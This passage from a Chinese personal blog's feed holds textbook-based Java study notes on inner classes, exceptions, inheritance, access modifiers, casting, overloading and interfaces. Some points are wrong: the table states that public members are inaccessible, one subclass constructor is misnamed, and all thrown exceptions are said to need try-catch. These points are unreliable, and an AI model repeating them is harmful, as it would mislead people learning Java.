方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口）</p></li></ol><h3 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h3><ul><li><p>内部类可以在类的局部位置定义（如方法）</p></li><li><p>在方法中定义的内部类只能使用方法中被 <code>final</code> 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。</p></li></ul><h3 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">A</span>() &#123;</span><br><span class="line">...<span class="comment">//内部类体</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。</p><h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><ul><li>创建静态内部类的对象不需要其外部类的对象；</li><li>静态内部类的对象中不能访问非静态外部类的对象。</li></ul><h3 id="内部类的继承"><a href="#内部类的继承" class="headerlink" title="内部类的继承"></a>内部类的继承</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OutputInnerClass</span> <span class="keyword">extends</span> <span class="title class_">ClassA</span>.ClassB &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">OutputInnerClass</span><span class="params">(classA a)</span> &#123;</span><br><span class="line">a.<span class="built_in">super</span>();<span class="comment">// 生成B类的外部类对象</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ClassB</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IV-异常捕捉"><a href="#IV-异常捕捉" class="headerlink" title="IV. 异常捕捉"></a>IV. 异常捕捉</h2><ol><li><p><code>try-catch</code> 语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可以发生异常的代码块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>finally</code> 语句：</p><p>无论 <code>try</code> 中的语句是否发生异常，都会执行 <code>finally</code> 中的代码块。<code>finally</code> 不被执行的情况：</p><ul><li><code>finally</code> 中发生异常；</li><li>之前的代码中使用 <code>System.exit()</code> 退出程序；</li><li>程序所在的线程死亡；</li><li>关闭CPU。</li></ul></li></ol><p>tips：</p><ul><li><code>Exception</code> 是 <code>try</code> 代码传递给 <code>catch</code> 代码块的变量类型；</li><li>异常处理常用的函数：<ul><li><code>getMessage()</code> ：输出错误性质；</li><li><code>toString()</code> ：给出异常的类型与性质；</li><li><code>printStackTrace()</code> ：指出异常的类型、性质、栈层次及出现在程序中的位置。</li></ul></li></ul><h2 id="V-Java常见异常"><a href="#V-Java常见异常" class="headerlink" title="V. Java常见异常"></a>V. Java常见异常</h2><table><thead><tr><th>异常类</th><th>说明</th></tr></thead><tbody><tr><td>ClassCastException</td><td>类型转换异常</td></tr><tr><td>ClassNotFoundException</td><td>未找到相应类异常</td></tr><tr><td>ArithmeticException</td><td>算术异常</td></tr><tr><td>ArrayIndexOutOfBoundsException</td><td>数组下标越界异常</td></tr><tr><td>ArrayStoreException</td><td>数组中包含不兼容的值抛出的异常</td></tr><tr><td>SQLException</td><td>操作数据库异常</td></tr><tr><td>NullPointerException</td><td>空指针异常</td></tr><tr><td>NoSuchFieldException</td><td>字段未找到异常</td></tr><tr><td>NoSuchMethodException</td><td>方法未找到异常</td></tr><tr><td>NumberFormatException</td><td>字符串转换为数字抛出的异常</td></tr><tr><td>NegativeArraySizeException</td><td>数组元素个数为负数抛出的异常</td></tr><tr><td>StringIndexOutOfBoundsException</td><td>字符串索引超出范围抛出的异常</td></tr><tr><td>IOException</td><td>输入输出异常</td></tr><tr><td>IllegalAccessException</td><td>不允许访问某类异常</td></tr><tr><td>InstantiationException</td><td>当应用程序试图使用 <code>Class</code> 类中的 <code>new Instance()</code> 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常</td></tr><tr><td>EOFException</td><td>文件已结束异常</td></tr><tr><td>FileNotFoundException</td><td>文件未找到异常</td></tr></tbody></table><h2 id="VI-自定义异常"><a href="#VI-自定义异常" class="headerlink" title="VI. 自定义异常"></a>VI. 自定义异常</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String ErrorMessage)</span> &#123; <span class="comment">// ErrorMessage为要输出的错误信息</span></span><br><span class="line">        <span class="built_in">super</span>(ErrorMessage);  <span class="comment">// 调用父类构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VII-抛出异常"><a href="#VII-抛出异常" class="headerlink" title="VII. 抛出异常"></a>VII. 抛出异常</h2><ol><li><p>throws：用于指定方法可能抛出的异常，用于将异常向上抛出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> <span class="keyword">throws</span> 异常<span class="number">1</span>, 异常<span class="number">2</span>, ... &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>throw：</p><ul><li>程序在执行到 <code>throw</code> 语句时立即终止，其后语句都不执行；</li><li><code>throw</code> 抛出的异常必须使用 <code>try-catch</code> 语句快捕捉；</li><li>若想向上级抛出异常，必须在抛出异常的方法中使用 <code>throws</code>。</li><li></li></ul></li></ol><p>参考资料《Java从入门到精通（第5版）》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;I-Java类包&quot;&gt;&lt;a href=&quot;#I-Java类包&quot; class=&quot;headerlink&quot; title=&quot;I. Java类包&quot;&gt;&lt;/a&gt;I. Java类包&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;类名冲突：&lt;/p&gt;
&lt;p&gt;任何类与接口都需要隶属于某一个类包。可以通过</summary>
      
    
    
    
    <category term="从继承开始的Java应用笔记" scheme="http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="http://blog.kekwy.com/tags/Java/"/>
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="编程" scheme="http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>接口、继承与多态</title>
    <link href="http://blog.kekwy.com/javaNotes-1/"/>
    <id>http://blog.kekwy.com/javaNotes-1/</id>
    <published>2022-07-30T07:00:16.000Z</published>
    <updated>2023-12-28T08:09:48.948Z</updated>
    
    <content type="html"><![CDATA[<h2 id="I-类的继承"><a href="#I-类的继承" class="headerlink" title="I. 类的继承"></a>I. 类的继承</h2><p>权限修饰关键字：</p><table><thead><tr><th>private</th><th>外部以及子类均不可访问</th></tr></thead><tbody><tr><td>public</td><td>外部以及子类均不可访问</td></tr><tr><td>protected</td><td>外部不可，但子类可以访问</td></tr></tbody></table><ul><li>定义类时通过关键字<code>extends</code> + 父类类名定义继承；</li><li>子类方法中可以通过super关键字调用父类方法（受权限修饰关键字约束）；</li><li>子类中可以通过定义与父类某一方法名称相同的函数实现对父类中该方法的重写（覆盖）；</li><li>重写时如修改方法的权限范围，只能从小到大；</li><li>重写时返回值必须与父类中同名函数返回值相同或为其子类；</li><li>子类实例化时会自动调用父类的无参构造方法，但若需调用有参构造方法需要通过super关键字手动调用；</li><li>子类<code>finalize()</code>方法需要保证最后一个动作是调用父类的<code>finalize()</code>方法；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doSomething2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doSomething3</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test <span class="title function_">doTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span> <span class="keyword">extends</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(); <span class="comment">//调用父类构造方法</span></span><br><span class="line">        <span class="built_in">super</span>.doSomething1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething3</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    private void doSomething3() &#123;</span></span><br><span class="line"><span class="comment">        //do something</span></span><br><span class="line"><span class="comment">    &#125; 写法错误</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> Test1 <span class="title function_">doTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="II-Object类"><a href="#II-Object类" class="headerlink" title="II. Object类"></a>II. Object类</h2><ol><li><p><code>Objcect</code> 类是所有Java类的父类。</p><p>tips：<code>Object</code> 类中的 <code>getClass()</code> 、<code>notify()</code> 、<code>notifyAll()</code> 、<code>wait()</code> 等方法不能在子类中重写。（被定义为final类型）</p></li><li><p><code>Object</code> 类中的重要方法：</p><ul><li><p><code>getClass()</code>：返回对象执行时的Class实例。<em>（Unity的getObejct）</em></p></li><li><p><code>toString()</code>：将一个对象返回为字符串，一般需要根据需要<strong>在子类中重写</strong>.</p><p>tips：将对象打印时将自动调用该方法。</p></li><li><p><code>equals()</code>：默认使用“&#x3D;&#x3D;”运算符根据对象的引用（地址）判断是否相等。故一般需要<strong>按需重写</strong>。</p></li></ul></li></ol><h2 id="III-对象类型的转换"><a href="#III-对象类型的转换" class="headerlink" title="III. 对象类型的转换"></a>III. 对象类型的转换</h2><ol><li><p>向上转型：将子类对象视为父类对象。由具体到抽象，总是安全的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Quadrangle</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Patallelogram</span>(); <span class="comment">// 平行四边形是四边形的子类</span></span><br></pre></td></tr></table></figure></li><li><p>向下转型：将父类对象转换为子类对象，必须通过强制类型转换，且必须保证当前父类对象是目标子类对象的实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Quadrangle</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Patallelogram</span>();</span><br><span class="line"><span class="type">Patallelogram</span> <span class="variable">q</span> <span class="operator">=</span> (Patallelogram)p;</span><br></pre></td></tr></table></figure></li></ol><h2 id="IV-使用instanceof操作符判断对象类型"><a href="#IV-使用instanceof操作符判断对象类型" class="headerlink" title="IV. 使用instanceof操作符判断对象类型"></a>IV. 使用instanceof操作符判断对象类型</h2><p>可用于实现向下转换时对父类对象实例类型的判断。</p><p>语法格式：（返回值为布尔型）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myobject <span class="keyword">instanceof</span> ExampleClass;</span><br><span class="line"><span class="comment">// myobject对象是否为ExampleClass类的实例</span></span><br></pre></td></tr></table></figure><h2 id="V-方法的重载"><a href="#V-方法的重载" class="headerlink" title="V. 方法的重载"></a>V. 方法的重载</h2><p>同过定义同名方法但参数不完全相同的方式实现方法的重载，但单单返回值不同不能实现重载。</p><p>编译器利用方法名、方法各参数类型和参数的个数以及参数的顺序来确定类中的方法是否唯一。</p><p>不定长参数也可以参与实现重载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>... a)</span>;</span><br></pre></td></tr></table></figure><h2 id="VI-抽象类与接口"><a href="#VI-抽象类与接口" class="headerlink" title="VI. 抽象类与接口"></a>VI. 抽象类与接口</h2><ol><li><p>抽象类</p><p>tips：</p><ul><li>抽象类不能实例化对象；</li><li>只有抽象类才可以承载抽象方法；</li><li>抽象方法在其子类中必须被重写。</li></ul><p>定义抽象类的关键字 <code>abstract</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">testAbstract</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接口：</p><p>定义接口使用关键字 <code>interface</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> interface 接口名 &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// 自动虚方法，可以省略abstract关键字</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>public：接口可以像类一样被权限修饰符修饰，但public关键字仅限于接口在与其同名的文件中被定义时；</li><li>接口中的方法必须被定义为public或abstract形式。</li></ul><p>实现接口使用关键字 <code>implements</code> ：</p><p>tips：Java中不许出现多继承但是可以通过同一个类实现许多接口来实现多继承，一个接口也可以继承另一个接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1</span></span><br><span class="line">class 类名 implements 接口<span class="number">1</span>，接口<span class="number">2</span>, ... &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#<span class="number">2</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">intf1</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">intf2</span> <span class="keyword">extends</span> <span class="title class_">intf1</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>参考资料《Java从入门到精通（第5版）》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;I-类的继承&quot;&gt;&lt;a href=&quot;#I-类的继承&quot; class=&quot;headerlink&quot; title=&quot;I. 类的继承&quot;&gt;&lt;/a&gt;I. 类的继承&lt;/h2&gt;&lt;p&gt;权限修饰关键字：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;private&lt;/th&gt;
&lt;</summary>
      
    
    
    
    <category term="从继承开始的Java应用笔记" scheme="http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="http://blog.kekwy.com/tags/Java/"/>
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="编程" scheme="http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
</feed>
